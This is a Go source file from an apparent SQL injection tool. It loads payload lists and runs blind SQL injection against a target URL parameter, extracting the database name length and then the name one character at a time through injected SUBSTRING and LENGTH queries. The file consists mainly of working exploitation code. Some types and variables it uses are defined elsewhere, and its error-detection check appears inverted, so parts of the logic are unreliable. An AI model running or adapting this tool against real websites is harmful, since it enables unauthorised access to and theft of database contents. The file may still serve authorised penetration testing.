package sql

import (
	"auditor/core/utils"
	"auditor/payloads/intruder/detect"
	"bufio"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

type SQLIType int

const (
	intruder   string   = "/handlers/sql/Intruder"
	ErrorBased SQLIType = iota
	SQLIBased
	TimeBased
	UnionBased
	BlindBased
)

func getDetectPayload(t SQLIType) []string {
	path := detectSelector(t)

	return ReadPayloads(path)
}

func detectSelector(t SQLIType) string {
	path, err := os.Getwd()
	if err != nil {
		return ""
	}
	switch t {
	case ErrorBased:
		{
			log.Println("ErrorBased")
			return fmt.Sprintf("%s%s%s", path, intruder, "/detect/Generic_ErrorBased.txt")
		}
	case SQLIBased:
		{
			log.Println("SQLIBased")
			return fmt.Sprintf("%s%s%s", path, intruder, "/detect/Generic_SQLI.txt")
		}
	case TimeBased:
		{
			log.Println("TimeBased")
			return fmt.Sprintf("%s%s%s", path, intruder, "/detect/Generic_TimeBased.txt")
		}
	case UnionBased:
		{
			log.Println("UnionBased")
			return fmt.Sprintf("%s%s%s", path, intruder, "/detect/Generic_UnionSelect.txt")
		}
	case BlindBased:
		{
			log.Println("BlindBased")
			return fmt.Sprintf("%s%s%s", path, intruder, "/detect/GenericBlind.txt")
		}
	default:
		log.Println("Default")
		return ""
	}
}

func ReadPayloads(path string) []string {
	readFile, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
	}
	fileScanner := bufio.NewScanner(readFile)

	fileScanner.Split(bufio.ScanLines)

	var payloadArr []string
	for fileScanner.Scan() {
		payloadArr = append(payloadArr, fileScanner.Text())
	}
	readFile.Close()
	return payloadArr
}

func validateByMethod(query string, method SQLiBased) int {
	u := *options.URL
	q := u.Query()
	q.Set(options.Parameter, options.ParameterValue+query)
	u.RawQuery = q.Encode()

	switch method {
	case LengthValidation:
		secondLen := utils.GetPageLength(u.String())
		if options.PageLength == secondLen {
			return 1
		}
		return 0

	case ErrorSQLiBased:

		html := utils.GetPageHTML(u.String())
		for _, valueErr := range detect.ErrPayloads {
			if !strings.Contains(html, valueErr) {
				return 1
			}
		}
		return 0
	}
	return 0
}

func generatePwnQuery(query string) string {
	payload := detect.Payloads

	splitPayload := strings.Split(payload[options.Payload], "AND")
	generatedPayload := splitPayload[0] + query + " AND" + splitPayload[1]
	return generatedPayload
}

func validatePwnType() SQLiBased {
	if validateByMethod("'", LengthValidation) == 0 && validateByMethod("'", ErrorSQLiBased) == 0 {
		return BetweenSQLiBased
	}
	if validateByMethod("'", LengthValidation) == 0 {
		return LengthValidation
	}
	if validateByMethod("'", ErrorSQLiBased) == 0 {
		return ErrorSQLiBased
	}
	return UnkownBased
}

func fetchDBNameLength(method SQLiBased) {
	p := "AND (SELECT LENGTH(database()))="
	for i := 3; i < 32; i++ {
		f := fmt.Sprintf("%s%s", p, strconv.Itoa(i))

		query := generatePwnQuery(f)
		if validateByMethod(query, method) == 1 {
			options.NameLength = i
			color.Green("\n[FOUND] Database Name Length: %d", i)
			break
		}
	}
}

func fetchDBName(method SQLiBased) {
	char := 1
	for {
		for _, c := range detect.Characters {
			f := fmt.Sprintf("%s%s%s%s%s",
				"AND (SUBSTRING(DATABASE(),",
				strconv.Itoa(char),
				",1))='",
				c,
				"'",
			)

			query := generatePwnQuery(f)
			if validateByMethod(query, method) == 1 {
				char++
				options.Name += c
				break
			}
		}
		if char == (options.NameLength + 1) {
			color.Green("[FOUND] DB Name: %s", options.Name)
			break
		}
	}
}
